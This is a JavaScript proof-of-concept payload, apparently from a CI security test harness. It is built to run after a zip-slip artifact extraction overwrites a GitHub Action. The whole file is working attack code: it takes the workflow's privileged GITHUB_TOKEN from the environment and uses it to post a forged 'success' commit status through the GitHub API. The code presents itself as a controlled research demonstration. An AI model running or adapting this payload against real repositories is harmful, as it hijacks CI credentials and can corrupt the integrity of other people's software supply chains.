const fs = require('fs')
const https = require('https')

const marker = 'PWNREQ_ARTIFACT_ZIPSLIP_RCE'
const token = process.env.INPUT_GITHUB_TOKEN || process.env.GITHUB_TOKEN
const repository = process.env.GITHUB_REPOSITORY
const commit = process.env.INPUT_COMMIT || process.env.GITHUB_SHA

console.log(`${marker}: overwritten action JavaScript executed`)
if (process.env.GITHUB_STEP_SUMMARY) {
  fs.appendFileSync(
    process.env.GITHUB_STEP_SUMMARY,
    `## ${marker}\n\nThe downloaded artifact overwrote the next action before execution.\n`
  )
}

if (!token || !repository || !commit) {
  throw new Error('missing token, repository, or commit input')
}

const body = JSON.stringify({
  state: 'success',
  context: 'pwnreq/artifact-zipslip-proof',
  description: 'Privileged token used by overwritten action code'
})

const request = https.request(
  {
    hostname: 'api.github.com',
    path: `/repos/${repository}/statuses/${commit}`,
    method: 'POST',
    headers: {
      Accept: 'application/vnd.github+json',
      Authorization: `Bearer ${token}`,
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(body),
      'User-Agent': 'pwnreq-controlled-proof',
      'X-GitHub-Api-Version': '2022-11-28'
    }
  },
  response => {
    let responseBody = ''
    response.on('data', chunk => {
      responseBody += chunk
    })
    response.on('end', () => {
      console.log(`${marker}: statuses API returned HTTP ${response.statusCode}`)
      if (response.statusCode < 200 || response.statusCode >= 300) {
        console.error(responseBody)
        process.exitCode = 1
      }
    })
  }
)

request.on('error', error => {
  console.error(error)
  process.exitCode = 1
})
request.end(body)
